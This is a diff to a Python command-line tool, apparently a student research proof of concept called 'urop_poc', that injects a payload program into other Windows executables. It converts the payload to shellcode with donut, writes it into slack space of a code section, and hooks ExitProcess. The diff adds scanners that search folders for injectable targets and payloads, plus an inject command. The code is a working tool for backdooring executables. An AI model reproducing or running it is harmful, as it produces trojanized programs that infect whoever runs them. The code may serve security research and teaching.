@@ -1,4 +1,4 @@
-import os, sys, string, io, pefile, struct, donut
+import os, sys, string, io, pefile, struct, donut, argparse, glob
 from pathlib import Path
 
 """
@@ -20,12 +20,22 @@ def get_appropriate_section_index(pe):
     return -1
 
 def is_payload_valid(payload):
-    pe = pefile.PE(payload)
-    return pe.has_relocs()
+    try:
+        pe = pefile.PE(payload)
+        if not pe.is_exe():
+            return False
+        return pe.has_relocs()
+    except:
+        return False
 
 def is_target_valid(target):
-    pe = pefile.PE(target)
-    return (get_appropriate_section_index(pe) >= 0) and (get_iat_entry(pe, "kernel32", b"ExitProcess") != None)
+    try:
+        pe = pefile.PE(target)
+        if not pe.is_exe():
+            return False
+        return (get_appropriate_section_index(pe) >= 0) and (get_iat_entry(pe, "kernel32", b"ExitProcess") != None)
+    except:
+        return False
 
 def align(val_to_align, alignment):
     return ((val_to_align + alignment - 1) // alignment) * alignment
@@ -61,6 +71,24 @@ def save_and_reload_pe_image(pe, output, resize=False):
 
 def inject_payload(target, payload, output):
     global LOADER_SHELLCODE
+        
+    if not is_payload_valid(payload):
+        print("Error: Payload needs to be relocatable.")
+        return
+
+    if not is_target_valid(target):
+        print("Error: No executable section found that has enough slack space.")
+        return
+
+    payload = donut.create(
+        file=payload,
+        arch=1
+    )
+    
+    if not payload:
+        print("Error: Payload couldn't be turned into shellcode.")
+        return
+    
     pe = pefile.PE(target)
     code_section_index = get_appropriate_section_index(pe)
     last_section_index = pe.FILE_HEADER.NumberOfSections - 1
@@ -109,25 +137,72 @@ def inject_payload(target, payload, output):
     pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
     pe.write(filename=output)
     
-def main(arguments):
-    if len(arguments) != 2 or not os.path.isfile(arguments[0]) or not os.path.isfile(arguments[1]):
-        print("Error: I need two files (target and payload).")
-        return
-
-    if not is_payload_valid(os.path.basename(arguments[1])):
-        print("Error: Payload needs to be relocatable.")
-        return
-
-    if not is_target_valid(os.path.basename(arguments[0])):
-        print("Error: No executable section found that has enough slack space.")
-        return
-
-    shellcodified_payload = donut.create(
-        file=os.path.basename(arguments[1]),
-        arch=1
-    )
-
-    inject_payload(os.path.basename(arguments[0]), shellcodified_payload, "output.exe")
-
+def find_payloads(payload):
+    for fn in glob.iglob(payload + "\\**", recursive=True):
+        if os.path.isfile(fn) and is_payload_valid(fn):
+            print(fn)
+        
+    
+def find_targets(target):
+    for fn in glob.iglob(target + "\\**", recursive=True):
+        if os.path.isfile(fn) and is_target_valid(fn):
+            print(fn)
+    
+class UROP_Command_Parser(object):
+     
+    def __init__(self):
+        parser = argparse.ArgumentParser(
+            description='Utility to inject a payload into target files',
+            usage='''urop_poc <command> [<args>]
+ 
+The following commands are available:
+  find_payloads     Finds valid payloads to inject in a specified folder
+  find_targets      Finds valid targets to inject into in a specified folder
+  inject            Injects payload into target file
+ 
+''')
+        parser.add_argument('command', help='Subcommand to run')
+        args = parser.parse_args(sys.argv[1:2])
+        if not hasattr(self, args.command):
+            print("Unrecognized command")
+            parser.print_help()
+            exit(1)
+        getattr(self, args.command)()
+ 
+    def find_payloads(self):
+        parser = argparse.ArgumentParser(
+            description='Checks the given directory for valid payloads')
+        parser.add_argument('directory', type=str, help='The name of the directory that you want to scan')
+        args = parser.parse_args(sys.argv[2:])
+        if not os.path.isdir(args.directory):
+            print("Error: Not a valid directory")
+            exit(1)
+        find_payloads(args.directory)
+       
+    def find_targets(self):
+        parser = argparse.ArgumentParser(
+            description='Checks the given directory for valid targets')
+        parser.add_argument('directory', type=str, help='The name of the directory that you want to scan')
+        args = parser.parse_args(sys.argv[2:])
+        if not os.path.isdir(args.directory):
+            print("Error: Not a valid directory")
+            exit(1)
+        find_targets(args.directory)
+        
+    def inject(self):
+        parser = argparse.ArgumentParser(
+            description='Injects payload into target and writes output to file')
+        parser.add_argument('target', type=str, help='The name of the target that you want to inject into')
+        parser.add_argument('payload', type=str, help='The name of the payload that you want to inject')
+        parser.add_argument('output', type=str, help='The name of the output file')
+        args = parser.parse_args(sys.argv[2:])
+        if not os.path.isfile(args.target):
+            print("Error: Not a valid target")
+            exit(1)
+        if not os.path.isfile(args.payload):
+            print("Error: Not a valid payload")
+            exit(1)
+        inject_payload(args.target, args.payload, args.output)
+ 
 if __name__ == "__main__":
-    main(sys.argv[1:])
+    UROP_Command_Parser()
